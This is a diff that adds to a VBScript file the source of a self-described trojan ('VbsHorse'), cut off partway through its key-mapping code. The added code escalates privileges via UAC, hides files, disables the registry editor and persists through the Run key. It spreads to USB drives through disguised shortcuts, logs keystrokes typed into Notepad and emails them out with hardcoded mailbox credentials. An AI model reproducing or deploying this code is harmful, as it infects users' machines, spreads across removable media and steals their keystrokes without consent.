@@ -1,39 +1,1010 @@
-'On Error Resume Next 'å®¹é”™è¯­å¥ï¼Œé¿å…ç¨‹åºå´©æºƒ
+Option Explicit
 
-Sub Main()
-	Call ConfigureTimeoutSetting()
-End Sub
+'+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+'+++++++++++++++++++++++++++++++++++++++³õÊ¼»¯ÅäÖÃÇøÓò++++++++++++++++++++++++++++++++++++++++
 
-Sub ConfigureTimeoutSetting()
-	Const TimeOutRegPath = "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout"
-	timeoutSetting = ReadReg(TimeOutRegPath) 'è¯»å…¥æ³¨å†Œè¡¨ä¸­çš„è¶…æ—¶é”®å€¼ 
-	If(timeoutSetting >= 1) Then 
-		Call WriteReg(TimeOutRegPath, 0, "REG_DWORD") 'è¶…æ—¶è®¾ç½®
+'****************************************** ²ÎÊıÉèÖÃ *****************************************
+
+Const WINDOW_TITLE			= "ÎŞ±êÌâ - ¼ÇÊÂ±¾"		'Òª¼àÊÓµÄ³ÌĞòµÄ´°¿Ú±êÌâÎÄ×Ö
+Const PROCESS_NAME			= "notepad.exe"			'Òª¼àÊÓµÄ³ÌĞòµÄ½ø³ÌÃû³Æ
+Const DYN_WRAP_DLL	 		= "dynwrap.dll"			'dynamic wrapperµÄÎÄ¼şÃû
+Const SENDER_MAIL_ADDRESS	= "2637252534@qq.com"	'ÓÃÓÚ·¢ËÍÓÊ¼şµÄÓÊÏäµØÖ·
+Const SENDER_MAIL_PASSWORD 	= "wzc123456"         	'ÓÃÓÚ·¢ËÍÓÊ¼şµÄÓÊÏäÃÜÂë
+Const SENDEE_MAIL_ADDRESS  	= "610955867@qq.com" 	'ÓÃÓÚ½ÓÊÕÓÊ¼şµÄÓÊÏäµØÖ·
+
+'*********************************** ÊÇ·ñÊÇÓÃ¿ì½İ·½Ê½´ò¿ª ************************************
+
+Dim g_isRunningWithLnk
+g_isRunningWithLnk = False
+
+'Call CheckOpenWithLnk()
+
+Sub CheckOpenWithLnk()
+	Dim args
+	Set args = WScript.Arguments
+	If args.Count = 2 Then 'UÅÌ¸ĞÈ¾ºóµÄ¿ì½İ·½Ê½Ä¬ÈÏÎªÁ½¸ö²ÎÊı µÚÒ»¸ö²ÎÊıÎªÔ­ÎÄ¼şÂ·¾¶ ºóÒ»¸ö²ÎÊıÎªshortcut
+		shortcutCheck = args(1)
+		If shortcutCheck <> "shortcut" Then Exit Sub
+		g_isRunningWithLnk = True
+		originFilePath = args(0)
+		Call OpenFile(originFilePath)
+		Call ReopenVbsHorse()
 	End If
 End Sub
 
-Function ReadReg(key) 'è¯»å–æ³¨å†Œè¡¨ï¼Œæœç´¢keyï¼Œè¿”å›æ‰€åœ¨è·¯å¾„
+'************************************* ÌáÉı½Å±¾ÔËĞĞÈ¨ÏŞ **************************************
+
+Dim g_isRunningWithoutUAC 'ÊÇ·ñÌáÉı¹ıÈ¨ÏŞ
+g_isRunningWithoutUAC = False
+
+Call DoUACRunScript()
+
+Sub DoUACRunScript()
+	If g_isRunningWithLnk Then 
+		g_isRunningWithoutUAC = True
+		Exit Sub
+	End If
+	Dim objOS
+	For Each objOS in GetObject("winmgmts:").InstancesOf("Win32_OperatingSystem") 
+		If InStr(objOS.Caption, "XP") = 0 Then 
+			If WScript.Arguments.Count = 0 Then
+				Dim objShell
+				Set objShell = CreateObject("Shell.Application")
+				objShell.ShellExecute "WScript.exe", Chr(34) &_
+				WScript.ScriptFullName & Chr(34) & " uac", "", "runas", 1
+				Set objShell = Nothing
+				g_isRunningWithoutUAC = True
+			End If
+		End If
+	Next
+End Sub
+
+'************************************* Ç¿ÖÆ³ÌĞòÒÔ32Î»Æô¶¯ ************************************
+
+Const DEFAULT_VBS_OPEN_COMMAND_KEY	= "HKLM\SOFTWARE\Classes\vbsfile\shell\open\command\"
+Const CUSTOM_VBS_OPEN_COMMAND_VALUE = """%SystemRoot%\SysWOW64\WScript.exe"" ""%1"" %*"
+
+Dim g_isRunningOnX86
+g_isRunningOnX86 = False
+
+Call OpenWithX86()
+
+Sub OpenWithX86() 'Ö÷º¯Êı£¬Ç¿ÖÆ³ÌĞòÒÔ32Î»WScript.exe½âÊÍÖ´ĞĞ
+	If g_isRunningWithoutUAC = True Then Exit Sub
+	If X86orX64() = "X64" Then
+		If ReadReg(DEFAULT_VBS_OPEN_COMMAND_KEY) <> CUSTOM_VBS_OPEN_COMMAND_VALUE Then
+			Call SetVbsFileAss()	'¸Ä±ävbs¸ñÊ½ÎÄ¼ş¹ØÁª
+			Call ReopenVbsHorse()	'ÖØĞÂÆô¶¯Ä¾Âí
+			Exit Sub
+		End If
+	End If	
+	g_isRunningOnX86 = True
+End Sub
+
+Sub ReopenVbsHorse()
+	Call OpenFile(WScript.ScriptFullName)
+End Sub
+
+Sub SetVbsFileAss() '¸Ä±ävbs¸ñÊ½ÎÄ¼ş¹ØÁª
+	Call WriteReg(DEFAULT_VBS_OPEN_COMMAND_KEY, CUSTOM_VBS_OPEN_COMMAND_VALUE, "REG_EXPAND_SZ")
+End Sub
+
+Function X86orX64() 'ÅĞ¶ÏÊÇX86¼Ü¹¹»¹ÊÇX64¼Ü¹¹
+	Dim objFileSystem, systemRootPath
+	Set objFileSystem = CreateObject("Scripting.FileSystemObject")
+	X86orX64 = "X86"
+	systemRootPath = objFileSystem.GetSpecialFolder(0) & "\" 
+	If objFileSystem.FolderExists(systemRootPath & "SysWow64") Then
+		X86orX64 = "X64"
+	End if
+End Function
+
+'******************************* ×¢²áDynamic Wrapper DLL ********************************
+
+Call RegisterDynamicWrapperDLL()	'×¢²áDynamic Wrapper DLL
+
+Sub RegisterDynamicWrapperDLL()		'×¢²áDynamic Wrapper DLL
+	If g_isRunningOnX86 = False Then Exit Sub
+	Dim strDllPath
+	strDllPath = Replace(WScript.ScriptFullName, WScript.ScriptName, DYN_WRAP_DLL)	'»ñÈ¡DLLÎÄ¼şµÄ¾ø¶ÔÂ·¾¶
+	Call RegisterCOM(strDllPath)	'×¢²áDynamicWrapper×é¼ş
+End Sub
+
+Sub RegisterCOM(strSource)			'×¢²á×é¼ş
+	Dim objFileSystem, objWshShell, strSystem32Dir
+	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
+	Set objWshShell = WScript.CreateObject("WScript.Shell")
+	strSystem32Dir = objWshShell.ExpandEnvironmentStrings("%WinDir%") & "\System32\"
+	If X86orX64 = "X64" Then
+		strSystem32Dir = objWshShell.ExpandEnvironmentStrings("%WinDir%") & "\SysWOW64\"
+	End If
+	
+	If objFileSystem.FileExists(strSystem32Dir & DYN_WRAP_DLL) Then Exit Sub
+	objFileSystem.CopyFile strSource, strSystem32Dir, False
+	WScript.Sleep 1000
+	
+	Dim blnComplete
+	blnComplete = False
+	Do
+		If objFileSystem.FileExists(strSystem32Dir & DYN_WRAP_DLL) Then
+			Dim regSvrPath
+			regSvrPath = strSystem32Dir & "regsvr32.exe /s "
+			objWshShell.Run regSvrPath & strSystem32Dir & DYN_WRAP_DLL
+			blnComplete = True
+		End If
+	Loop Until blnComplete
+	WScript.Sleep 2000 'ÑÓ³Ù2Ãë¸ø×¢²áCOMÔ¤ÁôÊ±¼ä
+	Set objFileSystem = Nothing
+	Set objWshShell = Nothing	
+End Sub
+
+'******************************** ×¢²áÒªÊ¹ÓÃµÄWin32APIº¯Êı ********************************
+
+Dim g_objConnectAPI
+
+Call ConfigureWin32API()
+
+Sub ConfigureWin32API
+	If g_isRunningOnX86 = False Then Exit Sub
+	Set g_objConnectAPI = WScript.CreateObject("DynamicWrapper") '´´½¨È«¾ÖµÄDynamicWrapper×é¼ş¶ÔÏóÊµÀı
+	With g_objConnectAPI 'ÒÔÏÂÎªÉùÃ÷½«ÒªÓÃµ½µÄWin32APIº¯Êı
+		.Register "user32.dll", "FindWindow", "i=ss", "f=s", "r=l"
+		.Register "user32.dll", "GetForegroundWindow", "f=s", "r=l"
+		.Register "user32.dll", "GetAsyncKeyState", "i=l", "f=s", "r=l"
+	End With
+End Sub
+
+'*************************************** Òş²ØËùÓĞÎÄ¼ş **************************************
+
+Call HideAllFile()
+
+Sub HideAllFile() 'Òş²ØËùÓĞÎÄ¼ş£¬ÆÆ»µExplorerÒş²ØÑ¡Ïî£¬Òş²Ø¿ì½İ·½Ê½Ğ¡¼ıÍ·£¬½ûÓÃ×¢²á±í¹¤¾ß
+	Const NoHiddenRegPath = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\NOHIDDEN\CheckedValue" 	
+	Const ShowAllRegPath = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue"		
+	Const ShowShortCurIconRegPath = "HKCR\lnkfile\IsShortcut"
+	Const RegToolForbidRegPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools"
+	Const HideFileRegRootPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\"
+	Call WriteReg(HideFileRegRootPath & "Hidden", 2, "REG_DWORD") 			'ÆÕÍ¨ÎÄ¼ş 			1-ÏÔÊ¾ 2-Òş²Ø
+	Call WriteReg(HideFileRegRootPath & "ShowSuperHidden", 0, "REG_DWORD") 	'ÊÜÏµÍ³±£»¤µÄÎÄ¼ş 	1-ÏÔÊ¾ 0-Òş²Ø
+	Call WriteReg(HideFileRegRootPath & "HideFileExt", 1, "REG_DWORD") 		'ÎÄ¼şÀ©Õ¹Ãû			0-ÏÔÊ¾ 1-Òş²Ø
+	Call WriteReg(NoHiddenRegPath, 3, "REG_DWORD") 							'ÆÆ»µÒş²ØÑ¡Ïî
+	Call WriteReg(ShowAllRegPath, 2, "REG_DWORD")							'ÆÆ»µÒş²ØÑ¡Ïî
+	Call WriteReg(RegToolForbidRegPath, 1, "REG_DWORD")						'½ûÓÃ×¢²á±í¹¤¾ß
+	Call DeleteReg(ShowShortCurIconRegPath) 								'Òş²Ø¿ì½İ·½Ê½Ğ¡¼ıÍ·
+	
+	'Call RestartExplorer() 'µ÷ÓÃ´Îº¯Êı¿ÉÒÔÇ¿ÖÆÖØÆôExplorerÒÔÇ¿ÖÆÒş²ØÎÄ¼şºÍ¿ì¼ü·½Ê½Ğ¡¼ıÍ·£¬µ«ÊÇ»áÒıÆğÓÃ»§µÄ×¢Òâ£¬ËìÈ¡Ïû
+End Sub
+
+'************************************* ¸´ÖÆ×ÔÉíµ½WinDir ************************************
+
+Call Propagate(GetPropagateTragetFolder)
+
+Sub Propagate(targetPath) '¸´ÖÆ×ÔÉíµ½Ö¸¶¨ÎÄ¼ş¼Ğ
+	If g_isRunningOnX86 = False Then Exit Sub
+	Dim objFileSystem
+	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
+	
+	Dim sourcePath, sourceName
+	sourcePath = objFileSystem.GetFile(WScript.ScriptFullName)
+	sourceName = objFileSystem.GetFile(WScript.ScriptFullName).Name
+	If objFileSystem.FileExists(targetPath & sourceName) = False Then
+		objFileSystem.CopyFile sourcePath, targetPath, False
+		Call HideFile(targetPath & sourceName)
+		WScript.Sleep 1000
+	End If
+	
+	Dim dllPath
+	dllPath = Replace(sourcePath, sourceName, DYN_WRAP_DLL)
+	If objFileSystem.FileExists(targetPath & DYN_WRAP_DLL) = False And objFileSystem.FileExists(dllPath)  Then
+		objFileSystem.CopyFile dllPath, targetPath, False
+		Call HideFile(targetPath & DYN_WRAP_DLL)
+		WScript.Sleep 3000
+	End If
+	Set objFileSystem = Nothing
+End Sub
+
+Function GetPropagateTragetFolder() '·µ»Ø·±Ö³µÄÄ¿Â¼
+	Dim objWshShell
+	Set objWshShell = CreateObject("WScript.Shell")
+	getPropagateTragetFolder = objWshShell.ExpandEnvironmentStrings("%WinDir%") & "\"
+	Set objWshShell = Nothing
+End Function
+
+Function GetSelfName()
+	Dim objFileSystem
+	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
+	GetSelfName = objFileSystem.GetFile(WScript.ScriptFullName).Name
+	Set objFileSystem = Nothing
+End Function
+
+'*************************************** ¿ª»ú×Ô¶¯ÔËĞĞ ***************************************
+
+Call ConfigureAutoRun()
+
+Sub ConfigureAutoRun()
+	If g_isRunningOnX86 = False Then Exit Sub
+	Dim objFileSystem
+	Set objFileSystem = WScript.CreateObject("scripting.filesystemobject")
+	Const REG_PATH = "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\"	'¿ª»úÆô¶¯µÄ×¢²á±íµØÖ·
+	Const KEY_NAME = "VbsHouse"												'ĞèÒª¿ª»úÆô¶¯µÄ³ÌĞòµÄ×¢²á±íÖ÷¼ü
+	Dim horsePath
+	horsePath = GetPropagateTragetFolder & GetSelfName						'ĞèÒª¿ª»úÆô¶¯µÄ³ÌĞòµÄ¾ßÌåÂ·¾¶
+	Call WriteReg(REG_PATH & KEY_NAME, horsePath, "") 						'ĞŞ¸Ä×¢²á±íÆô¶¯Ïî
+	Set objFileSystem = Nothing
+End Sub
+
+'************************************ ×¢²áÆäËüµÄÈ«¾Ö±äÁ¿ ************************************
+
+Dim g_theKeyResult 'ÓÃÓÚ±£´æ¼üÅÌ¼ÇÂ¼µÄ½á¹û
+g_theKeyResult = ""
+
+'**************************************** Ö´ĞĞÖ÷Ñ­»· ****************************************
+
+Call Main()
+
+Sub Main()
+	If g_isRunningOnX86 = False Then Exit Sub
+	Dim loopCount
+	loopCount = 0
+	Do 'Ñ­»·¼àÊÓÖ¸¶¨´°¿ÚºÍUÅÌ
+		If IsFoundWindowTitle() And IsTheWindowActive() Then Exit Do 'µ±Ö¸¶¨´°¿Ú´æÔÚÇÒÎªµ±Ç°¼¤»î´°¿ÚÌø³öÑ­»·
+		WScript.Sleep 500
+		
+		loopCount = loopCount - 1
+		If(loopCount < 0) Then
+			loopCount = 10
+			Call SniffUDisk()
+		End If
+	Loop
+	Call RecordKeyBoard()
+	'Call(SendEmail SENDER_MAIL_ADDR,SENDER_MAIL_PWD,SENDEE_MAIL_ADDR, "", "°´¼üÄÚÈİ", TheKeyResult, "") '·¢ËÍ°´¼üĞÅÏ¢µÄÓÊ¼ş
+	Call Main()
+End Sub
+
+'****************************************** ¸ĞÈ¾UÅÌ *****************************************
+
+Sub SniffUDisk()
+	Dim objFileSystem, SubDrives
+	Set objFileSystem = CreateObject("Scripting.FileSystemObject")
+	Set SubDrives = objFileSystem.Drives
+	Dim drive
+	For Each drive In SubDrives
+		Dim drivePath
+		drivePath = drive.DriveLetter
+		If drive.DriveType = 1 And drive.IsReady Then
+			Call InFectDrive(drivePath & ":\")
+		End If
+	Next
+	Set objFileSystem = Nothing
+	Set SubDrives = Nothing
+End Sub
+
+Sub InFectDrive(drivePath)
+	If HasInfected(drivePath) = False Then
+		Call Propagate(drivePath)
+	End If
+	Call LnkInfectDrive(drivePath)
+End Sub
+
+Function HasInfected(drivePath) 'ÅĞ¶ÏÊÇ·ñÒÑ¾­¸ĞÈ¾¹ıÖ¸¶¨ÅÌ·û
+	Dim objFileSystem
+	Set objFileSystem = CreateObject("Scripting.FileSystemObject")
+	Dim horseName, horsePath
+	horseName = objFileSystem.GetFile(Wscript.ScriptFullName).Name
+	horsePath = drivePath & horseName
+	
+	HasInfected = False
+	If objFileSystem.FileExists(horsePath) Then
+		HasInfected = True
+	End If
+	Set objFileSystem = Nothing
+End Function
+
+'************************************** ÓÃ¿ì½İ·½Ê½¸ĞÈ¾ **************************************
+
+Sub LnkInfectDrive(drivePath) 'Îª´ÅÅÌ¸ùÄ¿Â¼ÏÂËùÓĞµÄtxt, log, htmlÎÄ¼ş´´½¨Ö¸ÏòVbsHorseµÄ¿ì½İ·½Ê½£¬²¢Òş²ØÔ­ÎÄ¼ş
+	Dim objFileSystem
+	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
+	Dim folder, files
+	Set folder = objFileSystem.GetFolder(drivePath)
+	Set files = folder.Files
+	Dim file
+	For Each file In files
+		Dim fileSuffix
+		fileSuffix = GetFileSuffix(file.Name)
+		If fileSuffix <> "lnk" And file.Name <> GetSelfName Then 'ÊÇ·ñ²»ÊÇ¿ì½İ·½Ê½ÎÄ¼ş£¬ÇÒÎÄ¼şÃû²»ÊÇ²¡¶¾Ãû
+			Dim lnkPath
+			lnkPath = drivePath & file.Name & ".lnk"
+			If objFileSystem.FileExists(lnkPath) = False Then 'Èç¹û²»´æÔÚÎÄ¼ş
+				Dim targetPath, args
+				targetPath = drivePath & GetSelfName
+				args = Chr(34) & file.Name & Chr(34) & " shortcut"
+				Call CreateShortcutAndHideOriginFile(lnkPath, targetPath, args, file.Path) '´´½¨¶ÔÓ¦µÄ¿ì½İ·½Ê½²¢Òş²ØÔ­ÎÄ¼ş
+			End If
+		End If
+	Next
+	Set objFileSystem = Nothing
+End Sub
+
+Function GetFileSuffix(fileName)
+	Dim splitFileNameArray
+	splitFileNameArray = Split(fileName, ".")
+	GetFileSuffix = splitFileNameArray(UBound(splitFileNameArray))
+	Set splitFileNameArray = Nothing
+End Function
+
+Sub CreateShortcutAndHideOriginFile(lnkPath, targetPath, args, originFilePath) '´´½¨¶ÔÓ¦µÄ¿ì½İ·½Ê½²¢Òş²ØÔ­ÎÄ¼ş
+	Dim originFileSuffix, iconPath
+	originFileSuffix = GetFileSuffix(originFilePath)
+	Select Case originFileSuffix '¼ì²éÊÇ·ñÊÇtxt, log, html, htm, mhtÀàĞÍµÄÎÄ¼ş
+	Case "txt", "log" 'ÎÄ±¾
+		iconPath = "%SystemRoot%\System32\imageres.dll, 97"
+	Case "html", "htm", "mht" 'ÍøÒ³
+		iconPath = "%SystemRoot%\System32\imageres.dll, 2"
+	Case Else
+		Exit Sub
+	End Select
+	
+	Call HideFile(originFilePath) 'Òş²ØÔ­ÎÄ¼ş
+	
+	Dim objShell, shortcut
+	Set objShell = CreateObject("WScript.Shell")
+	Set shortcut = objShell.CreateShortcut(lnkPath)
+	With Shortcut
+		.TargetPath = targetPath
+		.Arguments = args
+		.WindowStyle = 4
+		.IconLocation = iconPath
+		.Save
+	End With
+	Set objShell = Nothing
+	Set shortcut = Nothing
+End Sub
+
+'*************************************** ¼ÇÂ¼¼üÅÌ²Ù×÷ ***************************************
+
+Sub RecordKeyboard()
+	Do '¿ªÊ¼Ñ­»·¼ÇÂ¼°´¼ü£¬µ±´°¿Ú³öÓÚ·Ç¼¤»î×´Ì¬ºó»òÕßÓÃ»§ÊäÈë»Ø³µ¼üºóÍ£Ö¹¼ÇÂ¼°´¼ü
+		If Not IsTheWindowActive() Then Exit Sub
+		Dim TheKey
+		theKey = ""
+		theKey = GetThePressKey()
+		g_theKeyResult = g_theKeyResult & theKey
+		WScript.Sleep 5
+	Loop Until theKey = "[ENTER]"
+	If SendEmail(SENDER_MAIL_ADDRESS, SENDER_MAIL_PASSWORD, SENDEE_MAIL_ADDRESS, "", "À´×ÔVbsHouseµÄÓÊ¼ş", "¸ĞĞ»Äú²âÊÔVbsHouse¡£ÄúÊÕµ½µÄ¼üÅÌ¼ÇÂ¼ĞÅÏ¢Îª:" & g_theKeyResult, "") Then
+		WScript.Echo "·¢ËÍÓÊ¼ş³É¹¦¡£ÄÚÈİ:" & g_theKeyResult
+	Else
+		WScript.Echo "·¢ËÍÓÊ¼şÊ§°Ü¡£ÄÚÈİ:" & g_theKeyResult
+End If
+	g_theKeyResult = ""  'Çå¿Õ¼üÅÌ¼ÇÂ¼
+End Sub
+
+Function IsFoundWindowTitle() '¼ì²âWINDOW_TITLEËùÖ¸¶¨±êÌâÎÄ×ÖµÄ´°¿ÚÊÇ·ñ´æÔÚ
+	Dim hWnd
+	hWnd = g_objConnectAPI.FindWindow(vbNullString,WINDOW_TITLE)
+	IsFoundWindowTitle = CBool(hWnd)
+End Function
+
+Function IsTheWindowActive() '¼ì²âWINDOW_TITLEËùÖ¸¶¨±êÌâÎÄ×ÖµÄ´°¿ÚÊÇ·ñÎªµ±Ç°¼¤»îµÄ´°¿Ú
+
+	Dim hWnd,hAct
+	hWnd = g_objConnectAPI.FindWindow(vbNullString,WINDOW_TITLE)
+	hAct = g_objConnectAPI.GetForegroundWindow()
+	IsTheWindowActive = CBool(hWnd=hAct)
+	
+End Function
+
+Function GetThePressKey() '»ñÈ¡¼üÅÌÉÏ±»°´ÏÂµÄ¼ü
+	With g_objConnectAPI
+	    If .GetAsyncKeyState(13) = -32767 Then
+		    GetThePressKey = "[ENTER]"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(17) = -32767 Then
+		    GetThePressKey = "[CTRL]"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(8) = -32767 Then
+		    GetThePressKey = "[BACKSPACE]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(9) = -32767 Then
+		    GetThePressKey = "[TAB]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(18) = -32767 Then
+		    GetThePressKey = "[ALT]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(19) = -32767 Then
+		    GetThePressKey = "[PAUSE]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(20) = -32767 Then
+		    GetThePressKey = "[CAPS LOCK]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(27) = -32767 Then
+		    GetThePressKey = "[ESC]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(33) = -32767 Then
+		    GetThePressKey = "[PAGE UP]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(34) = -32767 Then
+		    GetThePressKey = "[PAGE DOWN]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(35) = -32767 Then
+		    GetThePressKey = "[END]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(36) = -32767 Then
+		    GetThePressKey = "[HOME]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(44) = -32767 Then
+		    GetThePressKey = "[SYSRQ]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(45) = -32767 Then
+		    GetThePressKey = "[INS]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(46) = -32767 Then
+		    GetThePressKey = "[DEL]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(144) = -32767 Then
+		    GetThePressKey = "[NUM LOCK]"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(145) = -32767 Then
+		    GetThePressKey = "[SCROLL LOCK]"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(37) = -32767 Then
+		    GetThePressKey = "[LEFT]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(38) = -32767 Then
+		    GetThePressKey = "[UP]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(39) = -32767 Then
+		    GetThePressKey = "[RIGHT]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(40) = -32767 Then
+		    GetThePressKey = "[DOWN]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(112) = -32767 Then
+		    GetThePressKey = "[F1]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(113) = -32767 Then
+		    GetThePressKey = "[F2]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(114) = -32767 Then
+		    GetThePressKey = "[F3]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(115) = -32767 Then
+		    GetThePressKey = "[F4]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(116) = -32767 Then
+		    GetThePressKey = "[F5]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(117) = -32767 Then
+		    GetThePressKey = "[F6]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(118) = -32767 Then
+		    GetThePressKey = "[F7]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(119) = -32767 Then
+		    GetThePressKey = "[F8]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(120) = -32767 Then
+		    GetThePressKey = "[F9]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(121) = -32767 Then
+		    GetThePressKey = "[F10]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(122) = -32767 Then
+		    GetThePressKey = "[F11]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(123) = -32767 Then
+		    GetThePressKey = "[F12]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(124) = -32767 Then
+		    GetThePressKey = "[F13]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(125) = -32767 Then
+		    GetThePressKey = "[F14]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(126) = -32767 Then
+		    GetThePressKey = "[F15]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(127) = -32767 Then
+		    GetThePressKey = "[F16]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(32) = -32767 Then
+		    GetThePressKey = "[¿Õ¸ñ]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(186) = -32767 Then
+		    GetThePressKey = ";"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(187) = -32767 Then
+		    GetThePressKey = "="
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(188) = -32767 Then
+		    GetThePressKey = ","
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(189) = -32767 Then
+		    GetThePressKey = "-"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(190) = -32767 Then
+		    GetThePressKey = "."
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(191) = -32767 Then
+		    GetThePressKey = "/"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(192) = -32767 Then
+		    GetThePressKey = "`"
+		    Exit Function
+	    End If
+	  
+	    '----------NUM PAD----------
+	    If .GetAsyncKeyState(96) = -32767 Then
+		    GetThePressKey = "0"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(97) = -32767 Then
+		    GetThePressKey = "1"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(98) = -32767 Then
+		    GetThePressKey = "2"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(99) = -32767 Then
+		    GetThePressKey = "3"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(100) = -32767 Then
+		    GetThePressKey = "4"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(101) = -32767 Then
+		    GetThePressKey = "5"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(102) = -32767 Then
+		    GetThePressKey = "6"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(103) = -32767 Then
+		    GetThePressKey = "7"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(104) = -32767 Then
+	    	GetThePressKey = "8"
+	    	Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(105) = -32767 Then
+		    GetThePressKey = "9"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(106) = -32767 Then
+		    GetThePressKey = "*"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(107) = -32767 Then
+		    GetThePressKey = "+"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(108) = -32767 Then
+		    GetThePressKey = "[ENTER]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(109) = -32767 Then
+		    GetThePressKey = "-"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(110) = -32767 Then
+		    GetThePressKey = "."
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(&H1) = -32767 Then
+		    GetThePressKey = "[Êó±ê×ó¼ü]"
+		    Exit Function
+	    End If
+		
+	    If .GetAsyncKeyState(&H4) = -32767 Then
+		    GetThePressKey = "[Êó±êÖĞ¼ü]"
+		    Exit Function
+	    End If		
+		
+	    If .GetAsyncKeyState(&H2) = -32767 Then
+		    GetThePressKey = "[Êó±êÓÒ¼ü]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(220) = -32767 Then
+		    GetThePressKey = "\"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(222) = -32767 Then
+		    GetThePressKey = "'"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(221) = -32767 Then
+		    GetThePressKey = "[ÓÒ·½À¨ºÅ]"
+		    Exit Function
+	    End If
+	  
+	    If .GetAsyncKeyState(219) = -32767 Then
+		    GetThePressKey = "[×ó·½À¨ºÅ]"
+		    Exit Function
+	    End If
+	  	
+	    If .GetAsyncKeyState(16) = -32767 Then
+		    GetThePressKey = "[SHIFT]"
+		    Exit Function
+	    End If
+	  		  	
+	    If .GetAsyncKeyState(65) = -32767 Then
+		    GetThePressKey = "A"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(66) = -32767 Then
+		    GetThePressKey = "B"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(67) = -32767 Then
+		    GetThePressKey = "C"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(68) = -32767 Then
+		    GetThePressKey = "D"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(69) = -32767 Then
+		    GetThePressKey = "E"
+		    Exit Function
+	    End If
+	    
+	    If .GetAsyncKeyState(70) = -32767 Then
+		    GetThePressKey = "F"
